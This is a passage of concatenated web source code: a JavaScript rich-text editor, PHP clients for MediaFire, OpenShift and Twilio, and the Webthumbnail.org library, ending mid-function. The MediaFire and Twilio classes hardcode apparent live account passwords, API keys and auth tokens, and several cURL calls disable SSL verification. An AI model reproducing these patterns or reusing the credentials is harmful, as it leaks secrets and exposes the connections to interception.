 'red' : {'name':"&#32418;&#33394;",'color':"#F00000"},
 'pink' : {'name':"&#40092;&#31881;&#33394;",'color':"#F000F0"},
 'navy' : {'name':"&#28145;&#34013;&#33394;",'color':"#000080"},
 'blue' : {'name':"&#34013;&#33394;",'color':"#0000F0"},
 'lake' : {'name':"&#28246;&#34013;&#33394;",'color':"#00F0F0"},
 'cyan' : {'name':"&#34013;&#32511;&#33394;",'color':"#008080"},
 'green' : {'name':"&#32511;&#33394;",'color':"#008000"},
 'olive' : {'name':"&#27204;&#27012;&#33394;",'color':"#808000"},
 'aqua' : {'name':"&#27973;&#32511;&#33394;",'color':"#00F000"},
 'saff' : {'name':"&#27225;&#40644;&#33394;",'color':"#F0C000"},
 'black' : {'name':"&#40657;&#33394;",'color':"#000"},
 'gray' : {'name':"&#28784;&#33394;",'color':"#808080"},
 'arge' : {'name':"&#38134;&#33394;",'color':"#C0C0C0"},
 'white' : {'name':"&#30333;&#33394;",'color':"#FFF"}
};

var __CMItem = {
  'code':{'name':"&#32534;&#36753;&#36873;&#20013;&#20195;&#30721;",'fun':"__OpenFragmentCodeWindow()"}
};

var __TBMsg = {
 'codeMod':"Now Is Code Mode!\r\nMust Be Back Of View Mode!"
};

var _W,_H,_TH,_IH;
var __Mode = 1;
var __div;
var __iframe;
var __textarea;
var __EditorWindow;
var __FullScreenMode = 0;
var __EditorValue = '';
var __CurrentGEditor;
var __CurrentGMenuId;
var __CurrentRange;
var __EditorDialog;

// OutSide Vars
var __ImageRoot = '';
var __FileDialogPage = "";
var __SummaryID = "";
var __SummaryLen = 50;
var __ContentID = "";


/* ---------------------------- Pante Area ---------------------------- */
// Output The Editor
// @param string $InitValue  The Init_Value of Editor
// @param int/% arguments[1] The Width of Editor
// @param int arguments[2] The Height of Editor
function HtmlEditor(InitValue)
{
  CreateStyle();
  __FontNameMenu();
  __FontSizeMenu();
  __FontColorMenu();
  __FontBGColorMenu();  
  __ContextMenu();

  _W = 500;
  if(arguments[1])_W = arguments[1];
  _W = (_W.toString().indexOf("%") == -1 ? parseInt(_W)+"px" : _W);

  _H = 300;
  if(arguments[2])_H = parseInt(arguments[2]);
  _TH = 24;
  _IH = (_H - _TH) + "px";
  _H += "px";
  _TH += "px";

  if(document.getElementById(__ContentID)){InitValue = document.getElementById(__ContentID).value;}
  document.write("<div id='__EB__'> a</div>");
  var ebDiv = document.getElementById("__EB__");
  __div = ebDiv;
  ebDiv.style.width = _W;
  ebDiv.style.height = _H;
  ebDiv.style.border = "1px solid #CCC";
  ebDiv.style.background = "#ffffff";
  ebDiv.innerHTML = CreateToolBar();

  __textarea = document.createElement("textarea");
  __textarea.style.display = "none";
  __textarea.style.width = _W;
  __textarea.style.height = _IH;
  __textarea.style.fontSize = "12px";
  __textarea.style.color = "#00F";
  ebDiv.appendChild(__textarea);

  __iframe = document.createElement("iframe");
  __iframe.style.width = _W;
  __iframe.style.height = _IH;
  __iframe.style.background = "#FFF";
  __iframe.frameBorder = 0;
  __iframe.marginHeight = 0;
  __iframe.marginWidth = 0;
  __iframe.src = "about:blank";
  ebDiv.appendChild(__iframe);



  __EditorWindow = __iframe.contentWindow;
  with(__EditorWindow.document)
  {
    designMode = "On";
    open();
    write("<html><head><title>Editor Area</title><style type=\"text/css\"></style></head><body>&nbsp;</body></html>");
    close();
	body.style.width = "100%";
	body.style.width = "100%";
    body.style.fontSize = "14px";
    body.innerHTML = InitValue;
  }
  __AddEventHandler(__EditorWindow.document,"contextmenu", __MousRightButton);
  __AddEventHandler(__EditorWindow.document,"mouseup", __MouseUp);
  __AddEventHandler(__EditorWindow.document,"click", __MousLeftButton);
  __AddEventHandler(__EditorWindow.document,"keydown", __KeyDown);
  __AddEventHandler(__EditorWindow.document,"keyup", __KeyUp);
}

// Create Style
function CreateStyle()
{
  var style = "<style type='text/css'>\
  .toolBar {background:url("+ __ImageRoot +"bg.gif);overflow:hidden;}\
  .toolButton {color:#000000;text-decoration:none;float:left;margin:4px 2px;width:15px;height:15px;cursor:pointer;background:url("+ __ImageRoot +"mtoolallbg.gif);}\
  .toolLine {float:left;background:url("+ __ImageRoot +"mtoolallbg.gif);width:4px;margin:4px 0;}\
  .toolMenu {position:absolute;display:none;width:100px;font-size:12px;border:1px solid #CCC;background:#FFF;overflow:hidden;z-index:1001;}\
    .toolMenu a {width:100%;display:block;margin:2px;padding:0 2px;text-decoration:none;color:#000;height:18px;line-height:18px;}\
    .toolMenu a:hover {background:#876;color:#FFF;}\
      .toolMenu .egColor {float:left;display:block;margin:4px 0;width:6px;height:6px;border:1px solid #CCC;overflow:hidden;}\
  </style>";
  document.write(style);
}

// Create Tool Bar
function CreateToolBar()
{
    var item;

    var bdDiv = document.createElement("div");
    var tbDiv = document.createElement("div");
    tbDiv.style.height = _TH;
    tbDiv.className = "toolBar";

    for(var i in __TBData)
    {
        item = document.createElement("a");
        item.href="javascript:void(0)";

        item.style.backgroundPosition = __TBData[i]["bgp"];
        item.className = __TBData[i]["class"];
        item.title = __TBData[i]["tip"];
        item.id = "__" + i;
                 
        item.setAttribute("onclick", __TBData[i]["fun"]);
      
        if(__TBData[i]["class"] != "toolLine")
        {
          item.innerHTML="";        
          item.innerText="";
          item.innerHTML=__TBData[i]["html"];  
     	
          item.setAttribute("onmouseover", "__TBmor(this,'')");
          item.setAttribute("onmouseout", "__TBmot(this,'')");
        

        }
        tbDiv.appendChild(item);
    }

    bdDiv.appendChild(tbDiv);
    return bdDiv.innerHTML;
}


/* ---------------------------- Menu Area ---------------------------- */
// Font Name Menu
function __FontNameMenu()
{
  var items = "";
  for(var i in __TBFont)
  {
    items += "<a href='javascript:void(0)' style='font-family:"+ __TBFont[i]["name"] +"' title='"+ __TBFont[i]["name"] +"' onclick='"+ __TBFont[i]["fun"] +"'>"+ __TBFont[i]["name"] +"</a>";
  }
  document.write("<div id='__FontNameMenu__' class='toolMenu'>"+ items +"</div>");
}

// Font Size Menu
function __FontSizeMenu()
{
  var items = "";
  var fz = 0;
  for(var i=1;i<=7;i++)
  { fz = (i*10-i*3) > 10 ? (i*10-i*3) : 12;
    items += "<a href='javascript:void(0)' style='font-size:"+fz+"px;line-height:"+fz+"px;height:"+fz+"px;' title='"+ i +"&#21495;' onclick=\"__Format('FontSize',"+ i +")\">"+ i +"&#21495;</a>";
  }
  document.write("<div id='__FontSizeMenu__' class='toolMenu'>"+ items +"</div>");
}

// Font Color Menu
function __FontColorMenu()
{
  var items = "";
  for(var i in __TBColor)
  {
    items += "<a href='javascript:void(0)' title='"+ __TBColor[i]["name"] +"' onclick=\"__Format('ForeColor','"+ __TBColor[i]["color"] +"')\">";
    items += "<span style='background:"+ __TBColor[i]["color"] +"' class='egColor'>&nbsp;</span>&nbsp;";
    items += __TBColor[i]["name"] + "</a>";
  }
  document.write("<div id='__FontColorMenu__' class='toolMenu'>"+ items +"</div>");
}

// Font Background Color Menu
function __FontBGColorMenu()
{
  var items = "";
  for(var i in __TBColor)
  {
    items += "<a href='javascript:void(0)' title='"+ __TBColor[i]["name"] +"' onclick=\"__Format('backcolor','"+ __TBColor[i]["color"] +"')\">";
    items += "<span style='background:"+ __TBColor[i]["color"] +"' class='egColor'>&nbsp;</span>&nbsp;";
    items += __TBColor[i]["name"] + "</a>";
  }
  document.write("<div id='__FontBGColorMenu__' class='toolMenu'>"+ items +"</div>");
}



// Context Menu
function __ContextMenu()
{
  var items = "";
  for(var i in __CMItem)
  {
    items += "<a href='javascript:void(0)' title='"+ __CMItem[i]["name"] +"' onclick='"+ __CMItem[i]["fun"] +"'>"+ __CMItem[i]["name"] +"</a>";
  }
  document.write("<div id='__ContextMenu__' class='toolMenu'>"+ items +"</div>");
}


/* ---------------------------- Func Area ---------------------------- */
// Return And Get Editor innerHTML, And Return Summary, And Fill Content Element
function __EditGetValue()
{
  __EditorValue = __textarea.value = __SimpleHTML(cleanNodes(__EditorWindow.document.body.innerHTML));
  if(document.getElementById(__SummaryID))
  {
    if(isNaN(__SummaryLen)){__SummaryLen = 50;}
    var obj = document.getElementById(__SummaryID);
	var text = __EditorValue.replace(/<\/?[^>]*>|[\r\n]/gi, "");
	obj.value = text.substr(0, __SummaryLen);
  }
  if(document.getElementById(__ContentID)){document.getElementById(__ContentID).value = __EditorValue;}
  return __EditorValue;
}

// Check Input
function __CheckInput(e)
{
  if(e.keyCode==13){
    if(document.all){__PasteCode("<br />");e.returnValue = false;}else{/*e.preventDefault();*/}
  }
}

// Get Current Range
function __GetRange()
{
  with(__EditorWindow)
  {
    focus();
    if(document.all){return document.selection.createRange();}
    else{
      var selection = getSelection();
      return selection.getRangeAt(selection.rangeCount - 1).cloneRange();
    }
  }
}

// Get Selected Contents HTML
function __GetContentHtml()
{
  var oRange = __GetRange();
  if(document.all){return oRange.htmlText;}
  else{
	var contents = oRange.cloneContents();
	var cnt = document.createElement("div");
	cnt.appendChild(contents);
    return cnt.innerHTML;
  }
}

// paset Codes
function __PasteCode(sHTML)
{
  if (!__Mode){alert(__TBMsg['codeMod']);return;}
  var oRange = __GetRange();

  if(document.all){oRange.pasteHTML(sHTML);}
  else{
    var oFrag = oRange.createContextualFragment(sHTML);
	oRange.deleteContents();
	oRange.insertNode(oFrag);
  }
  __CloseMenu();
}

// Execute Command
function __Format(what,opt){

  if (!__Mode){alert(__TBMsg['codeMod']);return;}
  with(__EditorWindow)
  {
      focus();
      if(!opt){document.execCommand(what,false,false);}
      else{
        if(document.all){
        		document.execCommand(what,"",opt);
        	}else{document.execCommand(what,false,opt);}
      }
  }
  __CloseMenu();
}

// Show Menu __FontNameMenu__,__FontSizeMenu__,__FontColorMenu__,__FontBGColorMenu__
function __ShowMenu(obj,menuID)
{
  __CloseMenu();
  var w = document.defaultView ? document.defaultView.getComputedStyle(obj,null).width : obj.currentStyle.width;
  var h = document.defaultView ? document.defaultView.getComputedStyle(obj,null).height : obj.currentStyle.height;
  var x = __GetX(obj) + "px";
  var y = (__GetY(obj) + parseInt(h) - 2) + "px";

  menu = document.getElementById(menuID);
  menu.style.left = x;
  menu.style.top = y;
  menu.style.display = "block";

  __CurrentGMenuId = menuID;
}

// Show Context Menu
function __ShowContextMenu(e)
{
  __CloseMenu();
  var menuID = "__ContextMenu__";
  var x = (__GetX(__iframe) + e.clientX) + "px";
  var y = (__GetY(__iframe) + e.clientY) + "px";

  menu = document.getElementById(menuID);
  menu.style.left = x;
  menu.style.top = y;
  menu.style.display = "block";
  __CurrentGMenuId = menuID;
}

// Hidden Menu
function __CloseMenu()
{
  __EditGetValue();
  if(__CurrentGMenuId)
  {
    document.getElementById(__CurrentGMenuId).style.display = "none";
    __CurrentGMenuId = "";
  }
}

// Show And Hidden Code Area
function __CodeArea()
{
  var selects = document.getElementsByTagName("select");
  if(__textarea.style.display == "none")
  {
    __textarea.style.display = "";
    __iframe.style.display ="none";
    __Mode = 0;
  }
  else
  {
    __EditorWindow.document.body.innerHTML = __textarea.value;
    __textarea.style.display = "none";
    __iframe.style.display = "";
    __Mode = 1;
  }
  __HiddenSelect();
  __CloseMenu();
}

// Open Dialog For Edit Code
function __OpenFragmentCodeWindow()
{
  __CloseMenu();
  var html = __GetContentHtml();
  __WinOpen("about:blank",600,400);
  __EditorDialog.document.open();
  __EditorDialog.document.write("<textarea id='code' style='width:100%;height:90%;'>"+html+"</textarea>");
  __EditorDialog.document.write("<input type='button' value=' OK ' onclick='opener.__PasteCode(document.getElementById(\"code\").value);opener.__EditGetValue();self.close();' />");
  __EditorDialog.document.close();
}

// Show And Hidden Edit->document.body Elements Borders
function __ElementsBorder()
{
    var oCssRules;
    var cssTxt = "span{border:1px dashed #000;} table {border:1px solid #F00;}td {border:1px dashed #CCC;}";

    with(__EditorWindow){oCssRules = document.styleSheets[0].ownerNode || document.styleSheets[0];}
    if(document.all){
      if(oCssRules.cssText == ""){oCssRules.cssText = cssTxt;}
      else{oCssRules.cssText = "";}
    }
    else{
      if(oCssRules.innerHTML == ""){oCssRules.innerHTML = cssTxt;}
      else{oCssRules.innerHTML = "";}
    }
}

// Create Link
function __CreateLink(){
  with(__EditorWindow)
  {
    focus();	
	}
  if (document.all){
  	document.execCommand("CreateLink",true,true);
  }
  else{
    var sURL = window.prompt("Enter link location (e.g. http://www.xxx.com/):", "http://");
    if ((sURL!=null) && (sURL!="http://") && (sURL!="")){
    		__Format("CreateLink", sURL);
    }
    else{return false;}
  }
  __CloseMenu();
}

// Full Screen
function __FullScreen()
{
  var oHtml = document.getElementsByTagName("html");
  var sl = parseInt(document.body.scrollLeft);
  var st = parseInt(document.body.scrollTop);
  if(__FullScreenMode == 1)
  {
    document.body.style.width = document.body.style.height = "";
	document.body.style.overflow = "";
	oHtml[0].style.overflow = "";
    __div.style.position = "";
	__div.style.zIndex = "";
    __iframe.style.width = __textarea.style.width = __div.style.width = _W;
    __iframe.style.height = __textarea.style.height = _IH;
    __div.style.height = _H;
    __FullScreenMode = 0;
  }
  else
  {
	oHtml[0].style.overflow = "hidden";
	document.body.style.overflow = document.all ? "hidden" : "visible";
	document.body.style.width = document.body.style.height = 0;

    var page = __GetPageSize();
    __div.style.position = "absolute";
    __div.style.zIndex = 1000;
    __div.style.left = sl + "px";
    __div.style.top = st + "px";
    __iframe.style.width = __textarea.style.width = __div.style.width = page[2] + "px";
    __iframe.style.height = __textarea.style.height = __div.style.height = (page[3] - parseInt(_TH)) + "px";
    __FullScreenMode = 1;
  }
  document.body.scrollLeft = sl;
  document.body.scrollTop = st;
  __HiddenSelect();
}

// Open Image Dialog
function __OpenImageDialog()
{
    if(__FileDialogPage!=""){__WinOpen(__FileDialogPage,100,400);}
    else{
      __Attachement(window.prompt("Enter image location (e.g. http://www.xxx.com/):", "http://"));
    }
}

// Insert Attachements
function __Attachement(value)
{
  if(value)
  {
     var code = value.split(".");
     var ext = code[code.length-1].toLowerCase();

      switch(ext)
      {
          case "gif":
              code = "<img src=\""+ value +"\" />";
              break;
          case "jpg":
              code = "<img src=\""+ value +"\" />";
              break;
          case "png":
              code = "<img src=\""+ value +"\" />";
              break;
          case "swf":
              code = "<object classid=\"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000\">";
              code += "<param name=\"movie\" value=\""+ value +"\" />";
              code += "<param name=\"quality\" value=\"high\" />";
              code += "</object>";
              break;
          case "rm":
              code = "<object classid=\"clsid:CFCDAA03-8BE4-11cf-B84B-0020AFBBCCFA\" width=\"100\" height=\"50\">";
              code += "<param name=\"src\" value=\""+ value +"\" />";
              code += "<param name=\"autostart\" value=\"-1\" />";
              code += "</object>";
              break;
          case "mp3":
              code = "<embed src=\""+ value +"\" autostart=\"true\"></embed>";
              break;
          case "wma":
              code = "<embed src=\""+ value +"\" autostart=\"true\"></embed>";
              break;
          case "wmv":
              code = "<embed src=\""+ value +"\" autostart=\"true\"></embed>";
              break;
          default:
              code = "<a href=\""+ value +"\">"+ value +"</a>";
      }
      __PasteCode(code);
  }
}
</script>
<?php 
}

}	

class mediafire_class{

var $apikey = 'bfslvakd2r7m0i72j2i2b5az7dh9ct7vsmooyi8s';
var $appid = '24912';

function mediafirefileupload($uname,$pwd,$uploadkey,$filepath){
}

function mediafirefileconvert(){
	
								file_put_contents('wo2.txt', iconv('gb2312','utf-8','我我我我'));
	
               	$ch = curl_init();
               	//$header[] = "Authorization: GoogleLogin auth=".$authclientLogin;
               	//$header[] = "GData-Version: 2";
       					$url = "https://www.mediafire.com/api/user/get_session_token.php?email=".encodeuri('xcy6272003@126.com')."&password=".encodeuri('EUIfgwe7')."&application_id=24912&signature=".SHA1('xcy6272003@126.comEUIfgwe724912bfslvakd2r7m0i72j2i2b5az7dh9ct7vsmooyi8s')."&version=&response_format=json";
               	curl_setopt($ch, CURLOPT_URL, $url);
               	curl_setopt($ch, CURLOPT_HEADER, 0);
               	//curl_setopt($ch, CURLOPT_HTTPHEADER, $header);                  
               	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
               	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
               	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
               	curl_setopt($ch, CURLOPT_TIMEOUT, 150);
               	$jsonstr = json_decode(curl_exec($ch), true);
               	curl_close($ch);
               	print_r($jsonstr);
               	//echo $jsonstr['response']['session_token'];



}

}

class openshift_class{

function openshiftuserdomain($page,$pagesize,$uname,$pwd){

 								$url = "https://openshift.redhat.com/broker/rest/domains";
                $header[] = "Content-type:  application/json; version=1.0";
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $url);
                curl_setopt($ch, CURLOPT_HEADER, 0);
                //curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'POST');
                curl_setopt($ch, CURLOPT_HTTPHEADER, $header);                  
                //curl_setopt($ch, CURLOPT_POST, 1);
                //curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_TIMEOUT, 150);                 
                curl_setopt($ch, CURLOPT_USERPWD, $uname.':'.$pwd);
		        		$list = curl_exec($ch);
                curl_close($ch);
                //print_r(json_decode($list,true));								

                
			
    	    	$domainlist = array();
    	    	$domainarray = array();
    	    	$domainarray = json_decode($list,true);
   	     		$domainlist['length'] = count($domainarray['data']);
      
    	    	if ($objList->length > $pagesize) $strpagesize = $pagesize; else $strpagesize = $domainlist['length'];
   	     	$totalitem = $domainlist['length'];
   	     	if (fmod($totalitem, $pagesize) == 0){
   	             $totalpage=$totalitem/$pagesize;
     	   	}       
     	   	else{
     	           $totalpage=ceil($totalitem/$pagesize);
    	    	}       
  	      	if ($totalpage == $page)
  	              $endid = $totalitem-1;
  	      	elseif ($totalpage > $page)
	                $endid = floor($strpagesize*($page)-1);
 	       	elseif ($totalpage < $page){
 	               $endid = floor($strpagesize*($page-1)-1);
 	       	}                       
		
        	for($i = $strpagesize*($page-1);$i <= $endid;$i++){
                       		$domainlist['data'][$i]['userid'] = $domainarray['data'][$i]['id'];                        
                       		$domainlist['data'][$i]['methodlinks'] = $domainarray['data'][$i]['links'];                        
                       		$domainlist['data'][$i]['maindomain'] = $domainarray['data'][$i]['suffix'];                        
        	}		
       	
		return $domainlist;
		//return $vdiskarray;	
                
}

}
?>

<?php 

/**
 * =============================================================================
 * 
 * @file        webthumbnail.php
 * 
 * @desc        api.webthumbnail.org
 *              The Webthumbnail.org is a free webapi for capturing website 
 *              screenshots in real browsers. Ready to serve thousands of 
 *              thumbnails, fully scalable, cloud based!
 *              Visit http://webthumbnail.org for more information.
 *              
 * @copyright   Copyright (C) 2012 Idea4 Software, Lukasz Cepowski
 *              All rights reserved.
 *              www.idea4software.com
 *              
 * @license     Redistribution and use in source and binary forms, with or 
 *              without modification, are permitted provided that the following 
 *              conditions are met:
 *              
 *              - Redistributions of source code must retain the above copyright 
 *                notice, this list of conditions and the following disclaimer.
 *              
 *              - Redistributions in binary form must reproduce the above 
 *                copyright notice, this list of conditions and the following 
 *                disclaimer in the documentation and/or other materials 
 *                provided with the distribution.
 *                
 *              THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND 
 *              CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, 
 *              INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF 
 *              MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE 
 *              DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR 
 *              CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, 
 *              SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT 
 *              NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; 
 *              LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) 
 *              HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN 
 *              CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR 
 *              OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, 
 *              EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *              
 * =============================================================================
 */

class Webthumbnail
{
    
    const API_URL = 'http://api.webthumbnail.org/';
    
    const FORMAT_PNG = 'png';
    const FORMAT_JPG = 'jpg';
    const FORMAT_GIF = 'gif';
    
    const MIN_WIDTH = 100;
    const MAX_WIDTH = 500;
    
    const MIN_HEIGHT = 100;
    const MAX_HEIGHT = 500;
    
    const SCREEN_1024 = 1024;
    const SCREEN_1280 = 1280;
    const SCREEN_1650 = 1650;
    const SCREEN_1920 = 1920;
    
    protected $_url;
    protected $_width = self::MIN_WIDTH;
    protected $_height = self::MIN_HEIGHT;
    protected $_format = self::FORMAT_PNG;
    protected $_screen = self::SCREEN_1024;
    protected $_timeout = 12000;
    
    /**
     * Init webthumbnail.
     * @param string $url
     */
    public function __construct($url)
    {
        $this->_url = $url;
    }
    
    /**
     * Get url.
     * @return string
     */
    public function getUrl()
    {
        return $this->_url;
    }
    
    /**
     * Set width.
     * @param int $width
     * @return Webthumbnail
     */
    public function setWidth($width)
    {
        $this->_width = $this->_minmax((int) $width, self::MIN_WIDTH, self::MAX_WIDTH);
        return $this;
    }
    
    /**
     * Get width.
     * @return int
     */
    public function getWidth()
    {
        return $this->_width;
    }
    
    /**
     * Set height.
     * @param int $height
     * @return Webthumbnail
     */
    public function setHeight($height)
    {
        $this->_height = $this->_minmax((int) $height, self::MIN_HEIGHT, self::MAX_HEIGHT);
        return $this;
    }
    
    /**
     * Get height.
     * @return int
     */
    public function getHeight()
    {
        return $this->_height;
    }
    
    /**
     * Set format type.
     * @param string $format
     * @throws WebthumbnailException
     * @return Webthumbnail
     */
    public function setFormat($format)
    {
        switch (strtolower($format)) {
            case self::FORMAT_PNG:
            case self::FORMAT_JPG:
            case self::FORMAT_GIF:
                $this->_format = strtolower($format);
                break;
            default:
                throw new WebthumbnailException("Unsupported format type '{$format}'!");
        }
        return $this;
    }
    
    /**
     * Get format type.
     * @return string
     */
    public function getFormat()
    {
        return $this->_format;
    }
    
    /**
     * Get screen width.
     * @param string $screen
     * @throws WebthumbnailException
     * @return Webthumbnail
     */
    public function setScreen($screen)
    {
        switch ($screen) {
            case self::SCREEN_1024:
            case self::SCREEN_1280:
            case self::SCREEN_1650:
            case self::SCREEN_1920:
                $this->_screen = $screen;
                break;
            default:
                throw new WebthumbnailException("Unsupported screen width {$screen}!");
        }
        return $this;
    }
    
    /**
     * Get screen width.
     * @return string
     */
    public function getScreen()
    {
        return $this->_screen;
    }
    
    /**
     * Set timeout in seconds.
     * @param int $timeout
     * @return Webthumbnail
     */
    public function setTimeout($timeout)
    {
        $this->_timeout = (int) $timeout;
        return $this;
    }
    
    /**
     * Get timeout.
     * @return int
     */
    public function getTimeout()
    {
        return $this->_timeout;
    }
    
    /**
     * Get capture url.
     * @return string
     */
    public function getCaptureUrl()
    {
        return self::API_URL . 
            '?width='   . $this->_width .
            '&height='  . $this->_height .
            '&format='  . $this->_format .
            '&screen='  . $this->_screen .
            '&url=' . $this->_url;
    }
    
    /**
     * Execute the capture call.
     * @return WebthumbnailHttpCall
     */
    public function callCapture()
    {
        return new WebthumbnailHttpCall($this->getCaptureUrl());
    }
    
    /**
     * Execute the get-status call.
     * @return WebthumbnailHttpCall
     */
    public function callGetStatus()
    {
        return new WebthumbnailHttpCall($this->getCaptureUrl().'&action=get-status');
    }
    
    /**
     * Check if thumbnail is captured.
     * @return boolean
     */
    public function isCaptured()
    {
        $call = $this->callGetStatus();
        $response = $call->getResponse();
        switch ($response) {
            case 'finished':
                return true;
                
            case 'waiting':
            case 'pending':
            case 'loaded':
                return false;
                
            default:
                throw new WebthumbnailException('Invalid response from api server!');
        }
    }
    
    /**
     * Capture a thumbnail.
     * This method send a capture call and waits untill the thumbnail is ready or timeout is reached.
     * @return WebthumbnailHttpCall
     */
    public function capture($wait = true)
    {
        $i = 0;
        $this->callCapture();
        if ($wait) {
            while (!$this->isCaptured()) {
                if ($i++ >= $this->_timeout) {
                    throw new WebthumbnailException('Timeout, try again later!');
                }
                sleep(1);
            }
        }
        return $this->callCapture();
    }
    
    /**
     * Capture a thumbnail and send it to the browser.
     * @see examples/capture_to_browser.php
     * @return WebthumbnailHttpCall
     */
    public function captureToOutput($wait = true)
    {
        $call = $this->capture($wait);
        header("Content-Type: ".$call->getContentType());
        header("Content-Length: ".$call->getContentLength());
        echo $call->getResponse();
        return $call;
    }
    
    /**
     * Capture a thumbnail and send it to the file.
     * @see examples/capture_to_file.php
     * @param string $filename
     * @throws WebthumbnailException
     * @return WebthumbnailHttpCall
     */
    public function captureToFile($filename, $wait = true)
    {
        $call = $this->capture($wait);
        if (!@file_put_contents($filename, $call->getResponse(), LOCK_EX)) {
            throw new WebthumbnailException("Cannot write thumbnail to file '{$filename}'!");
        }
        return $call;
    }
    
    protected function _minmax($x, $min, $max)
    {
        if ($x < $min) {
            return $min;
        } else if ($x > $max) {
            return $max;
        }
        return $x;
    }
    
}

class WebthumbnailHttpCall
{
    
    public $_response;
    public $_statusCode;
    public $_contentType;
    public $_contentLength;
    
    /**
     * Create and execute a http call.
     * @param string $url
     * @throws WebthumbnailException
     */
    public function __construct($url)
    {
        if (!function_exists('curl_init')) {
            throw new WebthumbnailException("Curl is not supported by your version of PHP!");
        }
        
        $ch = curl_init($url);
        if (!$ch) {
            throw new WebthumbnailException("curl_init failed!");
        }
        
        $referer = '-';
        if (isset($_SERVER) && isset($_SERVER['HTTP_REFERER'])) {
            $referer = $_SERVER['HTTP_REFERER'];
        }
        
        $userAgent = 'Webthumbnail.org Client PHP/'.phpversion();
        if (isset($_SERVER) && isset($_SERVER['SERVER_SOFTWARE'])) {
            $userAgent .= ' ' . $_SERVER['SERVER_SOFTWARE'];
        }
        
        curl_setopt($ch, CURLOPT_REFERER, $referer);
        curl_setopt($ch, CURLOPT_USERAGENT, $userAgent);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		
        if (!ini_get('open_basedir') && !ini_get('safe_mode')) {
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        }
  
        $this->_response = curl_exec($ch);
        if (!$this->_response) {
            throw new WebthumbnailException("curl_exec failed!");
        }
        
        $this->_statusCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $this->_contentType = curl_getinfo($ch, CURLINFO_CONTENT_TYPE);
        $this->_contentLength = curl_getinfo($ch, CURLINFO_CONTENT_LENGTH_DOWNLOAD);
        
        curl_close($ch);
    }
    
    /**
     * Get response body.
     * @return string
     */
    public function getResponse()
    {
        return $this->_response;
    }
    
    /**
     * Get http status code.
     * @return int
     */
    public function getStatusCode()
    {
        return $this->_statusCode;
    }
    
    /**
     * Get content type.
     * @return string
     */
    public function getContentType()
    {
        return $this->_contentType;
    }
    
    /**
     * Get content length.
     * @return int
     */
    public function getContentLength()
    {
        return $this->_contentLength;
    }
    
}

class WebthumbnailException extends Exception {}
?>

<?php 
class twilio_class{

var $AccountSid = 'AC5a64a713dc6ed405fceb383fa316d920';
var $twilionumber = '+19712647061';
var $AuthToken = 'd6a4702860709aa568cd631acbb36f8a';

function transfercall($type='json',$clientdialnumber,$timestamp,$usercallid){
               	$url = "https://api.twilio.com/2010-04-01/Accounts/".$this->AccountSid."/Calls.".$type."?PageSize=5&From=".$clientdialnumber."&To=".$this->twilionumber;
               	$ch = curl_init();
               	curl_setopt($ch, CURLOPT_URL, $url);
               	curl_setopt($ch, CURLOPT_HEADER, 0);
               	//curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
               	//curl_setopt($ch, CURLOPT_POST, 1);
               	curl_setopt($ch, CURLOPT_USERPWD, $this->AccountSid.':'.$this->AuthToken);
               	//curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'POST');
               	//curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
               	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
               	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
               	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
               	curl_setopt($ch, CURLOPT_TIMEOUT, 150);
               	$jsonstr = json_decode(curl_exec($ch),true);
               	$httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
               	curl_close($ch);
               	//print_r($jsonstr); 
                for($i=0;$i<count($jsonstr['calls']);$i++){
                	if((abs(strtotime($jsonstr['calls'][$i]['date_created'])-$timestamp)<='3')&&($jsonstr['calls'][$i]['to']==$this->twilionumber)&&($jsonstr['calls'][$i]['from']==$clientdialnumber)&&(($jsonstr['calls'][$i]['status']!='completed')&&($jsonstr['calls'][$i]['status']!='failed')&&($jsonstr['calls'][$i]['status']!='no-answer'))){
                		//echo 'u';
                		$url = "https://api.twilio.com/2010-04-01/Accounts/".$this->AccountSid."/Calls/".$jsonstr['calls'][$i]['sid'].".".$type;
               			$postdata = array(
											"Url"  => "http://twimlets.com/echo?Twiml=".encodeuri("<Response><Dial><Number>".$usercallid."</Number></Dial></Response>")
										);          			
          					$header[] = "Content-length: ".strlen($postdata);                
                		//echo $postdata['url'];
                		$ch = curl_init();
                		curl_setopt($ch, CURLOPT_URL, $url);
                		curl_setopt($ch, CURLOPT_HEADER, 0);
                		curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
                		curl_setopt($ch, CURLOPT_POST, 1);
                		curl_setopt($ch, CURLOPT_USERPWD, $this->AccountSid.':'.$this->AuthToken);
                		curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'POST');
